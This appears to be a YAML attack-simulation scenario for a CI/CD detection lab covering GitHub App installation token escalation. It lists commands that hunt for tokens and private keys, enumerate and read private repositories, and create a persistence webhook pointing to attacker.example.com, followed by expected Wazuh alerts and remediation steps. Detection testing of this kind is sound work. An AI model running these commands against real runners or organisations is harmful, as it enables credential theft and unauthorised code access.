name: GitHub App Installation Token Escalation
description: Attacker escalates a GitHub App installation token to access repositories and resources beyond the intended scope by exploiting overpermissioned app installations
real_world_relevance: GitHub App token abuse in CI/CD pipelines, Dependabot token escalation CVE-2024-1482, Renovate bot token scope concerns, numerous GitHub App permission misconfiguration disclosures

attack_flow.description: Attacker obtains a GitHub App installation token and exploits its permissions to access repos beyond what the workflow should access
diagram: 1. Attacker extracts GitHub App private key or installation token from CI runner
2. Generates new installation access token with full app permissions
3. Uses token to enumerate accessible repositories
4. Accesses private repos, secrets, and environments beyond workflow scope
5. Creates new app installations or modifies existing permissions

phases.name: Token Discovery
phases.description: Locate GitHub App tokens and private keys in the runner environment

actions.command: env | grep -i GITHUB 2>/dev/null || echo 'No GitHub env vars'
find /runner -name '*.pem' -o -name 'github-app-key*' 2>/dev/null | head -5 || echo 'No GitHub App private keys found'
actions.description: Search for GitHub App private key files

phases.name: Installation Token Generation
phases.description: Generate a new installation access token with escalated scope

actions.command: curl -s -X POST http://mock-cicd:8080/github/app/installations/12345/access_tokens -H 'Authorization: Bearer ghs_FAKE_JWT_TOKEN' -H 'Accept: application/vnd.github+json' 2>/dev/null | python3 -m json.tool || echo 'Token generation failed'
actions.description: Request new installation token with full permissions

phases.name: Scope Escalation
phases.description: Use the token to access repos beyond intended scope

actions.command: curl -s http://mock-cicd:8080/github/installation/repositories -H 'Authorization: token ghs_FAKE_INSTALLATION_TOKEN' 2>/dev/null || echo 'Repo enumeration simulated'
actions.description: Enumerate all repositories accessible via installation token

actions.command: curl -s http://mock-cicd:8080/github/repos/org/private-repo/contents/secrets.yml -H 'Authorization: token ghs_FAKE_INSTALLATION_TOKEN' 2>/dev/null || echo 'Private repo access simulated'
actions.description: Access private repository contents beyond workflow scope

phases.name: Persistence via App Manipulation
phases.description: Modify app permissions or create webhooks for persistence

actions.command: curl -s -X POST http://mock-cicd:8080/github/repos/org/target-repo/hooks -H 'Authorization: token ghs_FAKE_INSTALLATION_TOKEN' -d '{"url": "https://attacker.example.com/webhook", "events": ["push"]}' 2>/dev/null || echo 'Webhook creation simulated'
actions.description: Create malicious webhook for persistent code access

indicators_of_compromise.description: GitHub App token scope escalation attempt
GitHub App accessing repos beyond installation scope

expected_wazuh_alerts.description: NHI: GitHub App token scope escalation attempt
NHI: GitHub App accessing repos beyond installation scope

immediate: Revoke the compromised GitHub App installation token
Rotate the GitHub App private key
Audit all API calls made with the escalated token
long_term: Apply principle of least privilege to GitHub App permissions
Use fine-grained personal access tokens instead of App tokens where possible
Implement IP allowlisting for GitHub App API access
Monitor for unusual repository access patterns via GitHub audit log
Use repository rulesets to restrict webhook creation

references.title: Legit Security - GitHub App Token Risks
